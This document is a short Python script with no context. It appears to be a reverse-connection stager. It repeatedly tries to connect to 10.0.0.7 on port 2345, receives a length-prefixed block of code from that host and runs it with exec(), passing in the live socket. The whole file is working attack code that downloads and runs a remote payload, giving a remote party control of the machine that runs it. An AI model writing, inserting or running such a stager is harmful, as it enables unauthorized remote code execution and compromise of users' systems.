import socket, struct, time
for x in range(10):
	try:
		s=socket.socket(2,socket.SOCK_STREAM)
		s.connect(('10.0.0.7',2345))
		break
	except:
		time.sleep(5)
l=struct.unpack('>l',s.recv(4))[0]
d=s.recv(l)
while len(d) < l:
	d+=s.recv(l-len(d))
exec(d,{'s':s})
